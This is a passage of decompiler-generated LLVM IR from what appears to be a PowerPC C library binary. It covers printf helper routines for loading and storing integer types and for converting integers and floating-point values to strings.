  store i32 0, i32* %r3.global-to-local, align 4
  %v1_1001223c = or i32 %v3_10012234, 64
  store i32 %v1_1001223c, i32* %r0.global-to-local, align 4
  %v1_10012240 = trunc i32 %v1_1001223c to i16
  store i16 %v1_10012240, i16* %v1_10012234, align 2
  %v0_10012244 = load i32, i32* %r0.global-to-local, align 4
  %v1_10012244 = urem i32 %v0_10012244, 65536
  store i32 %v1_10012244, i32* %r0.global-to-local, align 4
  %v1_10012248 = and i32 %v0_10012244, 2816
  store i32 %v1_10012248, i32* %r9.global-to-local, align 4
  %v3_10012248 = icmp eq i32 %v1_10012248, 0
  br i1 %v3_10012248, label %dec_label_pc_10012250, label %dec_label_pc_10012258

dec_label_pc_10012250:                            ; preds = %dec_label_pc_10012234
  %v0_10012250 = load i32, i32* @r31, align 4
  %v1_10012250 = add i32 %v0_10012250, 12
  %v2_10012250 = inttoptr i32 %v1_10012250 to i32*
  %v3_10012250 = load i32, i32* %v2_10012250, align 4
  store i32 %v3_10012250, i32* %r0.global-to-local, align 4
  %v2_10012254 = add i32 %v0_10012250, 28
  %v3_10012254 = inttoptr i32 %v2_10012254 to i32*
  store i32 %v3_10012250, i32* %v3_10012254, align 4
  br label %dec_label_pc_10012258

dec_label_pc_10012258:                            ; preds = %dec_label_pc_10012234, %dec_label_pc_100121bc, %dec_label_pc_10012250
  store i32 %v0_10012174, i32* %r0.global-to-local, align 4
  store i32 %v0_1001217c, i32* @r31, align 4
  %v0_10012268 = load i32, i32* %r3.global-to-local, align 4
  ret i32 %v0_10012268

; uselistorder directives
  uselistorder i32 %v0_10012244, { 1, 0 }
  uselistorder i32 %v1_10012220, { 1, 0 }
  uselistorder i32 %v0_10012218, { 1, 0 }
  uselistorder i32 %v0_100121e0, { 0, 1, 2, 4, 3, 5 }
  uselistorder i32 %v3_10012188, { 0, 2, 1, 3 }
  uselistorder i32* %r3.global-to-local, { 3, 1, 2, 0, 4, 5 }
  uselistorder i32* %r0.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 10, 9, 11, 12, 13, 14, 15 }
  uselistorder label %dec_label_pc_10012258, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10012234, { 1, 0 }
  uselistorder label %dec_label_pc_10012218, { 0, 2, 1 }
  uselistorder label %dec_label_pc_100121f8, { 1, 0 }
  uselistorder label %dec_label_pc_100121b0, { 1, 0 }
  uselistorder label %dec_label_pc_100121a4, { 1, 0 }
}

define i32 @_load_inttype(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %v0_1001226c = load i32, i32* @r5, align 4
  %v1_1001226c = icmp slt i32 %v0_1001226c, 0
  %v1_10012270 = call i32 @__asm_rlwinm(i32 %arg1, i32 0, i32 20, i32 20)
  %v3_100122ac = icmp eq i32 %v1_10012270, 0
  br i1 %v1_1001226c, label %dec_label_pc_100122ac, label %dec_label_pc_10012278

dec_label_pc_10012278:                            ; preds = %entry
  br i1 %v3_100122ac, label %dec_label_pc_10012280, label %dec_label_pc_100122b4

dec_label_pc_10012280:                            ; preds = %dec_label_pc_10012278
  %v3_10012280 = icmp eq i32 %arg1, 256
  br i1 %v3_10012280, label %dec_label_pc_1001228c, label %dec_label_pc_10012294

dec_label_pc_1001228c:                            ; preds = %dec_label_pc_10012280
  br label %dec_label_pc_100122a0

dec_label_pc_10012294:                            ; preds = %dec_label_pc_10012280
  %v3_10012294 = icmp eq i32 %arg1, 512
  br i1 %v3_10012294, label %dec_label_pc_1001229c, label %dec_label_pc_100122a0

dec_label_pc_1001229c:                            ; preds = %dec_label_pc_10012294
  br label %dec_label_pc_100122a0

dec_label_pc_100122a0:                            ; preds = %dec_label_pc_10012294, %dec_label_pc_1001228c, %dec_label_pc_1001229c
  ret i32 0

dec_label_pc_100122ac:                            ; preds = %entry
  br i1 %v3_100122ac, label %dec_label_pc_100122c0, label %dec_label_pc_100122b4

dec_label_pc_100122b4:                            ; preds = %dec_label_pc_10012278, %dec_label_pc_100122ac
  %v2_100122b4 = load i32, i32* %arg2, align 4
  ret i32 %v2_100122b4

dec_label_pc_100122c0:                            ; preds = %dec_label_pc_100122ac
  %v3_100122c0 = icmp eq i32 %arg1, 256
  %v2_100122c4 = load i32, i32* %arg2, align 4
  br i1 %v3_100122c0, label %dec_label_pc_100122cc, label %dec_label_pc_100122d4

dec_label_pc_100122cc:                            ; preds = %dec_label_pc_100122c0
  %v1_100122cc = urem i32 %v2_100122c4, 256
  br label %dec_label_pc_100122e0

dec_label_pc_100122d4:                            ; preds = %dec_label_pc_100122c0
  %v3_100122d4 = icmp eq i32 %arg1, 512
  br i1 %v3_100122d4, label %dec_label_pc_100122dc, label %dec_label_pc_100122e0

dec_label_pc_100122dc:                            ; preds = %dec_label_pc_100122d4
  %v1_100122dc = mul i32 %v2_100122c4, 65536
  %v2_100122dc = sdiv i32 %v1_100122dc, 65536
  br label %dec_label_pc_100122e0

dec_label_pc_100122e0:                            ; preds = %dec_label_pc_100122d4, %dec_label_pc_100122cc, %dec_label_pc_100122dc
  %v0_100122e0 = phi i32 [ %v2_100122c4, %dec_label_pc_100122d4 ], [ %v1_100122cc, %dec_label_pc_100122cc ], [ %v2_100122dc, %dec_label_pc_100122dc ]
  %tmp = icmp slt i32 %v0_100122e0, 0
  %v1_100122e4 = zext i1 %tmp to i32
  %v2_100122e4 = ashr i32 %v0_100122e0, 31
  %v3_100122e4 = and i32 %v2_100122e4, -2
  %v4_100122e4 = or i32 %v3_100122e4, %v1_100122e4
  ret i32 %v4_100122e4

; uselistorder directives
  uselistorder i32 %v0_100122e0, { 1, 0 }
  uselistorder i32 %v2_100122c4, { 2, 0, 1 }
  uselistorder i1 %v3_100122ac, { 1, 0 }
  uselistorder i32 %arg1, { 0, 4, 3, 1, 2 }
  uselistorder label %dec_label_pc_100122e0, { 2, 0, 1 }
  uselistorder label %dec_label_pc_100122b4, { 1, 0 }
  uselistorder label %dec_label_pc_100122a0, { 2, 0, 1 }
}

define i32 @_store_inttype(i16* %arg1) local_unnamed_addr {
entry:
  %tmp = ptrtoint i16* %arg1 to i32
  %v0_100122ec = load i32, i32* @r4, align 4
  %v3_100122ec = icmp eq i32 %v0_100122ec, 256
  br i1 %v3_100122ec, label %dec_label_pc_100122f8, label %dec_label_pc_10012300

dec_label_pc_100122f8:                            ; preds = %entry
  %v0_100122f8 = load i32, i32* @r6, align 4
  %v1_100122f8 = trunc i32 %v0_100122f8 to i8
  %tmp1 = bitcast i16* %arg1 to i8*
  store i8 %v1_100122f8, i8* %tmp1, align 1
  ret i32 %tmp

dec_label_pc_10012300:                            ; preds = %entry
  %v3_100122f0 = icmp eq i32 %v0_100122ec, 2048
  br i1 %v3_100122f0, label %dec_label_pc_10012308, label %dec_label_pc_10012314

dec_label_pc_10012308:                            ; preds = %dec_label_pc_10012300
  %v0_10012308 = load i32, i32* @r5, align 4
  %tmp2 = bitcast i16* %arg1 to i32*
  store i32 %v0_10012308, i32* %tmp2, align 4
  %v0_1001230c = load i32, i32* @r6, align 4
  %v3_1001230c = add i32 %tmp, 4
  %v4_1001230c = inttoptr i32 %v3_1001230c to i32*
  store i32 %v0_1001230c, i32* %v4_1001230c, align 4
  ret i32 %tmp

dec_label_pc_10012314:                            ; preds = %dec_label_pc_10012300
  %v3_10012300 = icmp eq i32 %v0_100122ec, 512
  %v0_10012318 = load i32, i32* @r6, align 4
  br i1 %v3_10012300, label %dec_label_pc_10012318, label %dec_label_pc_10012320

dec_label_pc_10012318:                            ; preds = %dec_label_pc_10012314
  %v1_10012318 = trunc i32 %v0_10012318 to i16
  store i16 %v1_10012318, i16* %arg1, align 2
  ret i32 %tmp

dec_label_pc_10012320:                            ; preds = %dec_label_pc_10012314
  %tmp3 = bitcast i16* %arg1 to i32*
  store i32 %v0_10012318, i32* %tmp3, align 4
  ret i32 %tmp

; uselistorder directives
  uselistorder i16* %arg1, { 2, 3, 1, 0, 4 }
}

define i32 @_uintmaxtostr(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %cr0_eq.global-to-local = alloca i1, align 1
  %r12.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  store i32 %arg5, i32* %r8.global-to-local, align 4
  store i32 %arg4, i32* %r7.global-to-local, align 4
  store i32 %arg3, i32* @r6, align 4
  store i32 %arg2, i32* %r5.global-to-local, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r3.global-to-local, align 4
  %v0_10012328 = load i32, i32* %r7.global-to-local, align 4
  %v3_10012328 = icmp eq i32 %v0_10012328, 0
  store i1 %v3_10012328, i1* %cr0_eq.global-to-local, align 1
  store i32 %arg5, i32* @r30, align 4
  %tmp12 = icmp sgt i32 %v0_10012328, -1
  br i1 %tmp12, label %dec_label_pc_1001235c, label %dec_label_pc_1001233c

dec_label_pc_1001233c:                            ; preds = %entry
  %v0_1001233c = load i32, i32* %r5.global-to-local, align 4
  %v1_10012340 = sub i32 0, %v0_10012328
  store i32 %v1_10012340, i32* %r7.global-to-local, align 4
  %tmp13 = icmp sgt i32 %v0_1001233c, -1
  br i1 %tmp13, label %dec_label_pc_1001235c, label %dec_label_pc_10012348

dec_label_pc_10012348:                            ; preds = %dec_label_pc_1001233c
  %v0_10012348 = load i32, i32* @r6, align 4
  %v1_10012348 = sub i32 0, %v0_10012348
  %v2_10012348 = sub i32 -1, %v0_10012348
  store i32 %v1_10012348, i32* @r6, align 4
  %v4_10012348 = icmp uge i32 %v2_10012348, %v1_10012348
  %v1_1001234c = sub i32 -1, %v0_1001233c
  %v3_1001234c = zext i1 %v4_10012348 to i32
  %v4_1001234c = add i32 %v3_1001234c, %v1_1001234c
  store i32 %v4_1001234c, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_1001235c

dec_label_pc_1001235c:                            ; preds = %entry, %dec_label_pc_1001233c, %dec_label_pc_10012348
  %v1_10012360 = phi i32 [ %v1_10012340, %dec_label_pc_10012348 ], [ %v1_10012340, %dec_label_pc_1001233c ], [ %v0_10012328, %entry ]
  %storemerge = phi i32 [ 1, %dec_label_pc_10012348 ], [ 0, %dec_label_pc_1001233c ], [ 0, %entry ]
  store i32 %storemerge, i32* @r29, align 4
  %v2_10012360 = udiv i32 -1, %v1_10012360
  store i32 %v2_10012360, i32* %r8.global-to-local, align 4
  %v2_10012368 = load i32, i32* %r3.global-to-local, align 4
  %v3_10012368 = inttoptr i32 %v2_10012368 to i8*
  store i8 0, i8* %v3_10012368, align 1
  %v0_1001236c = load i32, i32* %r8.global-to-local, align 4
  %v1_1001236c = load i32, i32* %r7.global-to-local, align 4
  %v2_1001236c = mul i32 %v1_1001236c, %v0_1001236c
  %v1_10012370 = sub i32 0, %v2_1001236c
  store i32 %v1_10012370, i32* @r31, align 4
  %v4_10012374 = icmp eq i32 %v1_1001236c, %v1_10012370
  br i1 %v4_10012374, label %dec_label_pc_1001237c, label %dec_label_pc_10012384

dec_label_pc_1001237c:                            ; preds = %dec_label_pc_1001235c
  %v1_1001237c = add i32 %v0_1001236c, 1
  store i32 %v1_1001237c, i32* %r8.global-to-local, align 4
  store i32 0, i32* @r31, align 4
  br label %dec_label_pc_10012384

dec_label_pc_10012384:                            ; preds = %dec_label_pc_1001235c, %dec_label_pc_1001237c
  %v0_10012384 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_10012384, i32* %r12.global-to-local, align 4
  br label %dec_label_pc_10012388

dec_label_pc_10012388thread-pre-split:            ; preds = %dec_label_pc_100123dc
  %v0_10012388.pr = load i32, i32* %r12.global-to-local, align 4
  %v1_1001238c.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_10012388

dec_label_pc_10012388:                            ; preds = %dec_label_pc_10012388thread-pre-split, %dec_label_pc_10012384
  %v1_100123d0 = phi i32 [ %v1_1001238c.pre, %dec_label_pc_10012388thread-pre-split ], [ %v1_1001236c, %dec_label_pc_10012384 ]
  %v1_100123a0 = phi i32 [ %v0_10012388.pr, %dec_label_pc_10012388thread-pre-split ], [ %v0_10012384, %dec_label_pc_10012384 ]
  %v3_10012388 = icmp eq i32 %v1_100123a0, 0
  %v0_1001238c = load i32, i32* @r6, align 4
  %v2_1001238c = udiv i32 %v0_1001238c, %v1_100123d0
  br i1 %v3_10012388, label %dec_label_pc_100123d0, label %dec_label_pc_10012394

dec_label_pc_10012394:                            ; preds = %dec_label_pc_10012388
  %v2_10012394 = udiv i32 %v1_100123a0, %v1_100123d0
  %v2_10012398 = mul i32 %v2_10012394, %v1_100123d0
  %v2_1001239c = mul i32 %v2_1001238c, %v1_100123d0
  %v2_100123a0 = sub i32 %v1_100123a0, %v2_10012398
  store i32 %v2_10012394, i32* %r12.global-to-local, align 4
  %v0_100123a8 = load i32, i32* @r31, align 4
  %v2_100123a8 = mul i32 %v0_100123a8, %v2_100123a0
  %v2_100123ac = sub i32 %v0_1001238c, %v2_1001239c
  %v2_100123b0 = add i32 %v2_100123a8, %v2_100123ac
  %v0_100123b4 = load i32, i32* %r8.global-to-local, align 4
  %v2_100123b4 = mul i32 %v0_100123b4, %v2_100123a0
  %v2_100123b8 = udiv i32 %v2_100123b0, %v1_100123d0
  %v2_100123bc = add i32 %v2_100123b4, %v2_1001238c
  %v2_100123c0 = mul i32 %v2_100123b8, %v1_100123d0
  %v2_100123c4 = add i32 %v2_100123bc, %v2_100123b8
  store i32 %v2_100123c4, i32* @r6, align 4
  %v2_100123c8 = sub i32 %v2_100123b0, %v2_100123c0
  store i32 %v2_100123c8, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_100123dc

dec_label_pc_100123d0:                            ; preds = %dec_label_pc_10012388
  %v2_100123d0 = mul i32 %v2_1001238c, %v1_100123d0
  %v2_100123d4 = sub i32 %v0_1001238c, %v2_100123d0
  store i32 %v2_100123d4, i32* %r5.global-to-local, align 4
  store i32 %v2_1001238c, i32* @r6, align 4
  br label %dec_label_pc_100123dc

dec_label_pc_100123dc:                            ; preds = %dec_label_pc_10012394, %dec_label_pc_100123d0
  %v1_100123e0 = phi i32 [ %v2_10012394, %dec_label_pc_10012394 ], [ 0, %dec_label_pc_100123d0 ]
  %v0_100123e0 = phi i32 [ %v2_100123c4, %dec_label_pc_10012394 ], [ %v2_1001238c, %dec_label_pc_100123d0 ]
  %v0_100123e4 = phi i32 [ %v2_100123c8, %dec_label_pc_10012394 ], [ %v2_100123d4, %dec_label_pc_100123d0 ]
  %v2_100123e0 = or i32 %v0_100123e0, %v1_100123e0
  %v5_100123e0 = icmp eq i32 %v2_100123e0, 0
  store i1 %v5_100123e0, i1* %cr0_eq.global-to-local, align 1
  %v1_100123e8 = load i32, i32* @r30, align 4
  %v0_100123ec = load i32, i32* %r3.global-to-local, align 4
  %v1_100123ec = add i32 %v0_100123ec, -1
  store i32 %v1_100123ec, i32* %r3.global-to-local, align 4
  %tmp14 = icmp ult i32 %v0_100123e4, 10
  %v1_100123e4.v2_100123e8.v = select i1 %tmp14, i32 48, i32 %v1_100123e8
  %v1_100123e4.v2_100123e8 = add i32 %v0_100123e4, %v1_100123e4.v2_100123e8.v
  %extract.t9.extract.t = trunc i32 %v1_100123e4.v2_100123e8 to i8
  %v3_100123fc = inttoptr i32 %v1_100123ec to i8*
  store i8 %extract.t9.extract.t, i8* %v3_100123fc, align 1
  %v0_10012400 = load i1, i1* %cr0_eq.global-to-local, align 1
  br i1 %v0_10012400, label %dec_label_pc_10012404, label %dec_label_pc_10012388thread-pre-split

dec_label_pc_10012404:                            ; preds = %dec_label_pc_100123dc
  %v0_10012404 = load i32, i32* @r29, align 4
  %v3_10012404 = icmp eq i32 %v0_10012404, 0
  br i1 %v3_10012404, label %dec_label_pc_10012404.dec_label_pc_10012414_crit_edge, label %dec_label_pc_1001240c

dec_label_pc_10012404.dec_label_pc_10012414_crit_edge: ; preds = %dec_label_pc_10012404
  %v0_1001241c.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10012414

dec_label_pc_1001240c:                            ; preds = %dec_label_pc_10012404
  %v2_10012410 = load i32, i32* %r3.global-to-local, align 4
  %v3_10012410 = add i32 %v2_10012410, -1
  %v4_10012410 = inttoptr i32 %v3_10012410 to i8*
  store i8 45, i8* %v4_10012410, align 1
  store i32 %v3_10012410, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10012414

dec_label_pc_10012414:                            ; preds = %dec_label_pc_10012404.dec_label_pc_10012414_crit_edge, %dec_label_pc_1001240c
  %v0_1001241c = phi i32 [ %v0_1001241c.pre, %dec_label_pc_10012404.dec_label_pc_10012414_crit_edge ], [ %v3_10012410, %dec_label_pc_1001240c ]
  ret i32 %v0_1001241c

; uselistorder directives
  uselistorder i32 %v2_10012394, { 1, 2, 0 }
  uselistorder i32 %v2_1001238c, { 3, 4, 0, 1, 2 }
  uselistorder i32 %v1_100123d0, { 0, 1, 4, 2, 3, 5, 6 }
  uselistorder i32 %v1_1001236c, { 1, 2, 0 }
  uselistorder i32 %v0_1001236c, { 1, 0 }
  uselistorder i32 %v0_10012328, { 1, 2, 0, 3 }
  uselistorder i32* %r8.global-to-local, { 2, 1, 3, 4, 0 }
  uselistorder i32* %r7.global-to-local, { 2, 3, 4, 0, 1 }
  uselistorder i32* %r5.global-to-local, { 2, 3, 4, 5, 0, 1 }
  uselistorder i32* %r3.global-to-local, { 2, 4, 3, 6, 5, 0, 1 }
  uselistorder i8 45, { 1, 0, 2, 3, 4 }
  uselistorder label %dec_label_pc_10012414, { 1, 0 }
  uselistorder label %dec_label_pc_100123dc, { 1, 0 }
  uselistorder label %dec_label_pc_10012384, { 1, 0 }
  uselistorder label %dec_label_pc_1001235c, { 2, 1, 0 }
}

define i32 @_fpmaxtostr(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %cr6_eq.global-to-local = alloca i1, align 1
  %cr6_gt.global-to-local = alloca i1, align 1
  %cr6_lt.global-to-local = alloca i1, align 1
  %cr7_eq.global-to-local = alloca i1, align 1
  %cr7_lt.global-to-local = alloca i1, align 1
  %ctr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r28.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r30.global-to-local = alloca i32, align 4
  %r31.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r5.global-to-local, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %tmp, i32* %r4.global-to-local, align 4
  store i32 %arg1, i32* %r3.global-to-local, align 4
  %tmp54 = call i32 @__decompiler_undefined_function_0()
  %tmp55 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-156 = alloca i32, align 4
  %stack_var_-200 = alloca i8, align 1
  %stack_var_-140 = alloca i32, align 4
  %stack_var_-179 = alloca i32, align 4
  %stack_var_-108 = alloca i32, align 4
  %stack_var_-120 = alloca i32, align 4
  %stack_var_-196 = alloca i32, align 4
  %stack_var_-177 = alloca i32, align 4
  %stack_var_-159 = alloca i32, align 4
  %stack_var_-178 = alloca i32, align 4
  %stack_var_-176 = alloca i32, align 4
  %stack_var_-132 = alloca i32, align 4
  %v0_10012420 = load i32, i32* @lr, align 4
  store i32 %v0_10012420, i32* %r0.global-to-local, align 4
  store i32 %arg1, i32* @r27, align 4
  store i32 %arg3, i32* @r26, align 4
  %v1_1001243c = add i32 %tmp, 11
  %v2_1001243c = inttoptr i32 %v1_1001243c to i8*
  %v3_1001243c = load i8, i8* %v2_1001243c, align 1
  %v4_1001243c = zext i8 %v3_1001243c to i32
  store i32 %v4_1001243c, i32* %r31.global-to-local, align 4
  %v1_10012440 = or i32 %v4_1001243c, 32
  %v1_10012444 = icmp ult i32 %v1_10012440, 97
  %v3_10012444 = icmp eq i32 %v1_10012440, 97
  store i1 %v1_10012444, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10012444, i1* %cr7_eq.global-to-local, align 1
  store i32 101, i32* %r0.global-to-local, align 4
  %v1_10012450 = add i32 %tmp, 4
  %v2_10012450 = inttoptr i32 %v1_10012450 to i32*
  %v3_10012450 = load i32, i32* %v2_10012450, align 4
  store i32 %v3_10012450, i32* %r28.global-to-local, align 4
  %v2_10012454 = load i32, i32* %arg2, align 4
  store i32 %v2_10012454, i32* %r30.global-to-local, align 4
  br i1 %v3_10012444, label %dec_label_pc_1001245c, label %dec_label_pc_10012464

dec_label_pc_1001245c:                            ; preds = %entry
  %v1_1001245c = add nuw nsw i32 %v4_1001243c, 6
  store i32 %v1_1001245c, i32* %r0.global-to-local, align 4
  %v1_10012460 = urem i32 %v1_1001245c, 256
  store i32 %v1_10012460, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_10012464

dec_label_pc_10012464:                            ; preds = %entry, %dec_label_pc_1001245c
  %v0_10012518 = phi i32 [ %v4_1001243c, %entry ], [ %v1_10012460, %dec_label_pc_1001245c ]
  %v1_10012464 = icmp slt i32 %v2_10012454, 0
  %v3_10012464 = icmp eq i32 %v2_10012454, 0
  store i1 %v1_10012464, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10012464, i1* %cr7_eq.global-to-local, align 1
  %tmp75 = icmp sgt i32 %v2_10012454, -1
  br i1 %tmp75, label %dec_label_pc_10012470, label %dec_label_pc_1001246c

dec_label_pc_1001246c:                            ; preds = %dec_label_pc_10012464
  store i32 6, i32* %r30.global-to-local, align 4
  br label %dec_label_pc_10012470

dec_label_pc_10012470:                            ; preds = %dec_label_pc_10012464, %dec_label_pc_1001246c
  %v0_1001262844 = phi i32 [ %v2_10012454, %dec_label_pc_10012464 ], [ 6, %dec_label_pc_1001246c ]
  %v1_10012470 = add i32 %tmp, 12
  %v2_10012470 = inttoptr i32 %v1_10012470 to i32*
  %v3_10012470 = load i32, i32* %v2_10012470, align 4
  store i32 %v3_10012470, i32* %r9.global-to-local, align 4
  %v1_10012474 = and i32 %v3_10012470, 2
  %v3_10012474 = icmp eq i32 %v1_10012474, 0
  store i32 0, i32* %r0.global-to-local, align 4
  store i8 0, i8* %stack_var_-200, align 1
  br i1 %v3_10012474, label %dec_label_pc_1001248c, label %dec_label_pc_10012498

dec_label_pc_1001248c:                            ; preds = %dec_label_pc_10012470
  %v1_1001248c = urem i32 %v3_10012470, 2
  store i32 %v1_1001248c, i32* %r7.global-to-local, align 4
  %v3_1001248c = icmp eq i32 %v1_1001248c, 0
  br i1 %v3_1001248c, label %dec_label_pc_1001249c, label %dec_label_pc_10012498

dec_label_pc_10012498:                            ; preds = %dec_label_pc_1001248c, %dec_label_pc_10012470
  %storemerge = phi i32 [ 43, %dec_label_pc_10012470 ], [ 32, %dec_label_pc_1001248c ]
  store i32 %storemerge, i32* %r0.global-to-local, align 4
  %v6_10012498 = trunc i32 %storemerge to i8
  store i8 %v6_10012498, i8* %stack_var_-200, align 1
  br label %dec_label_pc_1001249c

dec_label_pc_1001249c:                            ; preds = %dec_label_pc_1001248c, %dec_label_pc_10012498
  store i32 0, i32* %r0.global-to-local, align 4
  br i1 %v3_10012464, label %dec_label_pc_10012600, label %dec_label_pc_10012518

dec_label_pc_10012518:                            ; preds = %dec_label_pc_1001249c
  %v1_10012518 = icmp ult i32 %v0_10012518, 96
  %v2_10012518 = icmp ugt i32 %v0_10012518, 96
  %v3_10012518 = icmp eq i32 %v0_10012518, 96
  store i1 %v1_10012518, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10012518, i1* %cr7_eq.global-to-local, align 1
  %v2_10012520 = add i32 %tmp, 16
  %v3_10012520 = inttoptr i32 %v2_10012520 to i32*
  store i32 32, i32* %v3_10012520, align 4
  store i32 3, i32* %r0.global-to-local, align 4
  store i32 3, i32* %stack_var_-140, align 4
  br i1 %v2_10012518, label %dec_label_pc_10012544, label %dec_label_pc_10012538

dec_label_pc_10012538:                            ; preds = %dec_label_pc_10012518
  store i32 12, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_10012544

dec_label_pc_10012544:                            ; preds = %dec_label_pc_10012518, %dec_label_pc_10012538
  %stack_var_-136.1 = phi i32 [ add (i32 ptrtoint ([4 x i8]* @global_var_1001a598.674 to i32), i32 8), %dec_label_pc_10012518 ], [ add (i32 ptrtoint ([4 x i8]* @global_var_1001a598.674 to i32), i32 12), %dec_label_pc_10012538 ]
  store i32 ptrtoint ([4 x i8]* @global_var_1001a598.674 to i32), i32* %r9.global-to-local, align 4
  %v2_10012550 = ptrtoint i32* %stack_var_-132 to i32
  store i32 %v2_10012550, i32* %r8.global-to-local, align 4
  store i32 %stack_var_-136.1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_100129f0

dec_label_pc_10012600:                            ; preds = %dec_label_pc_1001249c
  store i32 -1, i32* %r4.global-to-local, align 4
  %v2_10012604 = ptrtoint i32* %stack_var_-176 to i32
  store i32 %v2_10012604, i32* %r6.global-to-local, align 4
  store i32 268566528, i32* %r9.global-to-local, align 4
  store i32 0, i32* %r7.global-to-local, align 4
  store i32 1127219200, i32* %r3.global-to-local, align 4
  %v1_10012650 = xor i32 %tmp54, -2147483648
  br label %dec_label_pc_10012624

dec_label_pc_10012624:                            ; preds = %dec_label_pc_100126a4.dec_label_pc_10012624_crit_edge, %dec_label_pc_10012600
  %v0_10012628 = phi i32 [ %v0_10012628.pre, %dec_label_pc_100126a4.dec_label_pc_10012624_crit_edge ], [ %v0_1001262844, %dec_label_pc_10012600 ]
  %v3_10012628 = call %0 @__asm_cror(i32 %v0_10012628, i32 %tmp, i32 %v0_10012628)
  %v11_10012628 = extractvalue %0 %v3_10012628, 7
  store i4 %v11_10012628, i4* @cr4, align 1
  %v0_1001262c = load i1, i1* %cr7_eq.global-to-local, align 1
  br i1 %v0_1001262c, label %dec_label_pc_10012640, label %dec_label_pc_10012654

dec_label_pc_10012640:                            ; preds = %dec_label_pc_10012624
  store i32 %tmp54, i32* %r10.global-to-local, align 4
  br label %dec_label_pc_10012654

dec_label_pc_10012654:                            ; preds = %dec_label_pc_10012624, %dec_label_pc_10012640
  %storemerge2 = phi i32 [ %v1_10012650, %dec_label_pc_10012640 ], [ %tmp55, %dec_label_pc_10012624 ]
  store i32 %storemerge2, i32* %r10.global-to-local, align 4
  store i32 9, i32* %r9.global-to-local, align 4
  store i32 9, i32* %ctr.global-to-local, align 4
  %v0_10012664 = load i32, i32* %r6.global-to-local, align 4
  %v1_10012664 = add i32 %v0_10012664, 9
  store i32 %v1_10012664, i32* %r6.global-to-local, align 4
  store i32 0, i32* %r8.global-to-local, align 4
  store i32 10, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_10012680

dec_label_pc_10012680:                            ; preds = %dec_label_pc_10012680.dec_label_pc_10012680_crit_edge, %dec_label_pc_10012654
  %v1_10012688 = phi i32 [ %v1_10012688.pre, %dec_label_pc_10012680.dec_label_pc_10012680_crit_edge ], [ %v1_10012664, %dec_label_pc_10012654 ]
  %v0_10012684 = phi i32 [ %v0_10012684.pre, %dec_label_pc_10012680.dec_label_pc_10012680_crit_edge ], [ 0, %dec_label_pc_10012654 ]
  %v1_10012680 = phi i32 [ %v1_10012680.pre, %dec_label_pc_10012680.dec_label_pc_10012680_crit_edge ], [ 10, %dec_label_pc_10012654 ]
  %v1_10012690 = phi i32 [ %v0_10012680.pre, %dec_label_pc_10012680.dec_label_pc_10012680_crit_edge ], [ %storemerge2, %dec_label_pc_10012654 ]
  %v2_10012680 = udiv i32 %v1_10012690, %v1_10012680
  store i32 %v2_10012680, i32* %r0.global-to-local, align 4
  %v1_10012684 = add i32 %v0_10012684, 1
  store i32 %v1_10012684, i32* %r8.global-to-local, align 4
  %v2_10012688 = sub i32 %v1_10012688, %v1_10012684
  store i32 %v2_10012688, i32* %r11.global-to-local, align 4
  %tmp76 = mul i32 %v2_10012680, -10
  store i32 %v2_10012680, i32* %r10.global-to-local, align 4
  %v2_10012690 = add i32 %v1_10012690, 48
  %v1_10012698 = add i32 %v2_10012690, %tmp76
  store i32 %v1_10012698, i32* %r9.global-to-local, align 4
  %v1_1001269c = trunc i32 %v1_10012698 to i8
  %v3_1001269c = inttoptr i32 %v2_10012688 to i8*
  store i8 %v1_1001269c, i8* %v3_1001269c, align 1
  %v0_100126a0 = load i32, i32* %ctr.global-to-local, align 4
  %v1_100126a0 = add i32 %v0_100126a0, -1
  store i32 %v1_100126a0, i32* %ctr.global-to-local, align 4
  %v2_100126a0 = icmp eq i32 %v1_100126a0, 0
  br i1 %v2_100126a0, label %dec_label_pc_100126a4, label %dec_label_pc_10012680.dec_label_pc_10012680_crit_edge

dec_label_pc_10012680.dec_label_pc_10012680_crit_edge: ; preds = %dec_label_pc_10012680
  %v0_10012680.pre = load i32, i32* %r10.global-to-local, align 4
  %v1_10012680.pre = load i32, i32* %r5.global-to-local, align 4
  %v0_10012684.pre = load i32, i32* %r8.global-to-local, align 4
  %v1_10012688.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_10012680

dec_label_pc_100126a4:                            ; preds = %dec_label_pc_10012680
  %v0_100126a4 = load i32, i32* %r7.global-to-local, align 4
  %v1_100126a4 = icmp slt i32 %v0_100126a4, 0
  %v3_100126a4 = icmp eq i32 %v0_100126a4, 0
  store i1 %v1_100126a4, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_100126a4, i1* %cr7_eq.global-to-local, align 1
